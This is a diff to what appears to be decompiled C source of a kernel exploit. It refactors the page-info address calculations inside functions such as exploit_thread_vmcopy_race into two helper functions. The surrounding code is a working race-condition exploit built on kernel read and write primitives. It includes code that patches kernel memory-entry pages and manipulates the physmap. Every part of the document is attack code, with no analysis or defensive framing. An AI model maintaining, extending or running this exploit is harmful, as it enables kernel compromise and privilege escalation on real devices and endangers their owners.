@@ -119,6 +119,20 @@ static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 page
   kwrite_u64_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
 }
 
+static inline uint64_t vmcopy_page_info_addr_from_ref(uint32_t ref, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
+{
+  if ( (ref & 0x80000000u) != 0 )
+    return packedBase + 48LL * (ref & 0x7FFFFFFFu);
+  return ((uint64_t)ref << pageShift) + linearBase;
+}
+
+static inline uint64_t vmcopy_page_info_ref_from_addr(uint64_t addr, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
+{
+  if ( addr >= packedBase )
+    return ((addr - packedBase) / 48) | 0x80000000u;
+  return (addr - linearBase) >> pageShift;
+}
+
 //----- (00000000000068F4) ----------------------------------------------------
 void __fastcall deallocate_physmap_pages(__int64 a1)
 {
@@ -7862,10 +7876,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     v4 = kread_u64_value(*v2, v3 + 16);
     v5 = kread_u64_value(*v2, v4 + 24);
     v6 = kread_u32_value(*v2, v5 + 60);
-    if ( (v6 & 0x80000000) != 0 )
-      v7 = 48LL * (v6 & 0x7FFFFFFF);
-    else
-      v7 = ((unsigned __int64)v6 << v159) + v106;
+    v7 = vmcopy_page_info_addr_from_ref(v6, 0, v106, v159);
     v8 = kread_u64_value(*v2, v7 + 32);
     v9 = kread_u32_value(*v2, v7);
   }
@@ -7888,7 +7899,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
       *(uint64_t *)(someStruct + 32) = v19;
       if ( v19 )
       {
-        v20 = (v19 & 0x80000000) != 0 ? v109 + 48LL * (v19 & 0x7FFFFFFF) : ((unsigned __int64)v19 << v159) + v106;
+        v20 = vmcopy_page_info_addr_from_ref(v19, v109, v106, v159);
         if ( (unsigned int)kread_u32_value(*v2, v20 + 48) > 0xFFF )
           break;
       }
@@ -8102,28 +8113,14 @@ LABEL_68:
     kwrite_u64_to_addr(*v2, v23 + qword_48008 - 8, v100);
     kwrite_u64_to_addr(*v2, qword_48008 + v23, v96);
     v63 = kread_u32_value(*v2, v20);
-    if ( (v63 & 0x80000000) != 0 )
-    {
-      v65 = v109 + 48LL * (v63 & 0x7FFFFFFF);
-      v64 = v106;
-    }
-    else
-    {
-      v64 = v106;
-      v65 = ((unsigned __int64)v63 << v159) + v106;
-    }
+    v64 = v106;
+    v65 = vmcopy_page_info_addr_from_ref(v63, v109, v106, v159);
     while ( kread_u64_value(*v2, v65 + 24) != v108 )
     {
       v66 = kread_u32_value(*v2, v65 + 8);
-      if ( (v66 & 0x80000000) != 0 )
-        v65 = v109 + 48LL * (v66 & 0x7FFFFFFF);
-      else
-        v65 = ((unsigned __int64)v66 << v159) + v64;
+      v65 = vmcopy_page_info_addr_from_ref(v66, v109, v64, v159);
     }
-    if ( v65 >= v109 )
-      v67 = ((v65 - v109) / 0x30) | 0x80000000;
-    else
-      v67 = (v65 - v64) >> v159;
+    v67 = vmcopy_page_info_ref_from_addr(v65, v109, v64, v159);
     v99 = v67;
     v144 = 0;
     vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
